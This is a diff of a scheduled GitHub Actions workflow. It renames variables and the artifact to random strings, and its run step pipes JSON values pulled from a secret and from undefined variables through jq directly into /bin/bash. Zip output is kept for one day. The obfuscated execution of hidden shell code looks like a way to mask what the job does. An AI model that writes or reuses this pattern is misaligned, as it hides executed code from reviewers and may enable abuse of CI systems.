@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '14 3,9,15,21 * * *'
+    - cron: '56 5,11,17,23 * * *'
 jobs:
   workflow:
     runs-on: ubuntu-latest
@@ -15,14 +15,15 @@ jobs:
           fetch-depth: 1
       - name: Perform
         env:
-          vjp11: ${{ secrets.vjp11 }}
+          nzzl7832: ${{ secrets.nzzl7832 }}
         run: |
-          printf '%s' "$vjp11" | jq -r .b03140 | /bin/bash
-          echo $ioeo778 | jq -r .pdzjm2 | /bin/bash
+          printf '%s' "$nzzl7832" | jq -r .mq8036 | /bin/bash
+          printf '%s' "$ojg427" | jq -r .yaa2 | /bin/bash
+          printf '%s' "$dl51381" | jq -r .qb96 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
         with:
-          name: JyuEoW19
+          name: g1hoQGUP
           path: "*.zip"
           retention-days: 1
